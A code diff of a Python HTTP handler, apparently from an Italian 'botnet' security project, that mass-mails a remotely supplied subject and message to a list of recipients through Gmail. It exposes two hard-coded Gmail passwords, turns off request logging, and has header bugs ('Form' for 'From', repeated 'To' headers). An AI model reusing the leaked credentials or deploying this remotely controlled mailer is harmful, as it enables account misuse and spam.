@@ -3,6 +3,8 @@ import platform
 import smtplib
 import ssl
 import threading
+from email.mime.text import MIMEText
+
 import psutil
 from http.server import BaseHTTPRequestHandler
 import requests
@@ -28,11 +30,12 @@ class HTTPServerRH(BaseHTTPRequestHandler):
     event = threading.Event()
     smtp_server = "smtp.gmail.com"
     port = 465
-    password = "okhdsuuaxseqzrnz"
-    sender = "flypilot.51@gmail.com"
+    password = "cebqshlncuewhjso"
+    sender = "botnetsicurezza@gmail.com"
     context = ssl.create_default_context()
-    #def log_message(self, format, *args):
-     #   return
+
+    def log_message(self, format, *args):
+       return
 
     def do_GET(self):
         if self.path == "/status":
@@ -108,8 +111,7 @@ class HTTPServerRH(BaseHTTPRequestHandler):
             self.send_header('Content-type', 'application/json')
             self.end_headers()
             try:
-                print(data)
-                p = threading.Thread(target=self.sendEmail, args=(data['utenti'], data['messaggio']))
+                p = threading.Thread(target=self.sendEmail, args=(data['oggetto'], data['messaggio'], data['utenti']))
                 p.daemon = True
                 p.start()
             except Exception as e:
@@ -129,11 +131,15 @@ class HTTPServerRH(BaseHTTPRequestHandler):
                 i += 1
         self.event.clear()
 
-    def sendEmail(self, utenti, data):
+    def sendEmail(self, oggetto, message, utenti):
         try:
             with smtplib.SMTP_SSL(self.smtp_server, self.port, context=self.context) as server:
                 server.login(self.sender, self.password)
+                msg = MIMEText(message)
+                msg['Subject'] = oggetto
+                msg['Form'] = self.sender
                 for u in utenti:
-                    server.sendmail(self.sender, u, data)
+                    msg['To'] = u
+                    server.sendmail(self.sender, u, msg.as_string())
         except Exception as e:
             print(e)
